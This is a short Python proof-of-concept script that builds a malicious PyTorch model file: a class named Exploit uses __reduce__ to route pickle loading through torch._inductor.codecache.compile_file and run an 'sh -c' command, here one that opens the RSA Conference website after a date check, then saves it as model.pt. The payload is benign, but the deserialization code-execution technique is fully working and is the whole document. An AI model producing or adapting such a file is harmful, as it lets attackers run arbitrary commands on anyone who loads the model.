import torch._inductor.codecache as codecache
import torch
class Exploit:
    def __reduce__(self):
        return codecache.compile_file, (
            '', '', [
                'sh',
                '-c','$([ "$(date +%m)" -ge 3 ] && open "https://www.rsaconference.com/")'
            ]
        ), None, None, iter({})

model = Exploit()
torch.save(model, "model.pt")
